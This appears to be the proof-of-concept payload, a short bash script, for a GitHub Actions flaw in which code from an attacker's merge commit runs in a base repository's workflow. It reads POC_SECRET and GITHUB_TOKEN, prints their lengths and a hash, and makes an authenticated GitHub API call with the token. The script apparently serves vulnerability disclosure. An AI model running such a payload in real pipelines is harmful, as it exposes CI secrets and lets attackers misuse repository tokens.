#!/usr/bin/env bash
echo "PWNED-BY-ATTACKER-MERGE-COMMIT"
echo "pwd=$(pwd)"
echo "args=$*"
echo "POC_SECRET_LEN=${#POC_SECRET}"
echo "POC_SECRET_SHA=$(printf %s "$POC_SECRET" | sha256sum | cut -d' ' -f1)"
echo "GITHUB_TOKEN_LEN=${#GITHUB_TOKEN}"
echo "--- authenticated API call with base-repo GITHUB_TOKEN ---"
curl -s --max-time 20 -H "Authorization: token ${GITHUB_TOKEN}" https://api.github.com/repos/PDFtoMark/gab-poc-airflow-wfr-base | grep -o '"full_name":"[^"]*"\|"full_name": "[^"]*"' | head -1
echo "--- environment marker ---"
echo "GITHUB_EVENT_NAME=${GITHUB_EVENT_NAME} GITHUB_REPOSITORY=${GITHUB_REPOSITORY}"
echo "marker2"
echo "marker3"
